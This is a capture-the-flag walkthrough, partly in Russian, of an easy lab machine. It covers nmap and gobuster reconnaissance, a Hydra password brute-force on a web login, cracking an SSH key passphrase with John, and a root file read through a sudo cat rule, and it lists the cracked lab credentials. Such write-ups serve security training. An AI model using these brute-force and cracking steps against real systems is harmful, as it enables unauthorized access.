# Brute It — Writeup

**Target:** 10.112.167.25  
**Difficulty:** Easy

---

## 1. Reconnaissance (Nmap)

```bash
nmap -sC -sV 10.112.167.25
```

**Result:**
- 22/tcp — OpenSSH 7.6p1 Ubuntu
- 80/tcp — Apache httpd 2.4.29 (Ubuntu), default page

---

## 2. Web Enumeration

**Directory brute-force (Gobuster):**

```bash
gobuster dir -u http://10.112.167.25 -w /usr/share/wordlists/dirb/common.txt
```

**Found:**
- `/admin` — login panel
- `/robots.txt` — disallow: /admin

**robots.txt:**
```
User-agent: *
Disallow: /admin
```

---

## 3. Admin Panel

Открываем `http://10.112.167.25/admin` — форма логина.

Пробуем стандартные креды, смотрим исходный код страницы:

```html
<!-- Hey john, if you do not remember, the username is admin -->
```

**Username:** `admin`

---

## 4. Brute-force пароля (Hydra)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.112.167.25 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Invalid"
```

**Found:**
- `admin:xavier`

Логинимся — получаем панель с ссылкой на приватный ключ и флагом.

---

## 5. RSA Key & John

Скачиваем `id_rsa`, конвертируем в hash:

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

**Passphrase:** `rockinroll`

```bash
chmod 600 id_rsa
ssh -i id_rsa john@10.112.167.25
```

---

## 6. Privilege Escalation

```bash
sudo -l
```

**Result:**
```
(ALL) NOPASSWD: /usr/bin/cat
```

Читаем `/root/root.txt`:

```bash
sudo cat /root/root.txt
```

**Root flag:** `[REDACTED]`

---

## 7. User Flag

```bash
cat /home/john/user.txt
```

**User flag:** `[REDACTED]`

---

## Summary

| Stage | Credential |
|-------|------------|
| Web admin | `admin:xavier` |
| SSH key passphrase | `rockinroll` |
| Privesc | `sudo cat` |
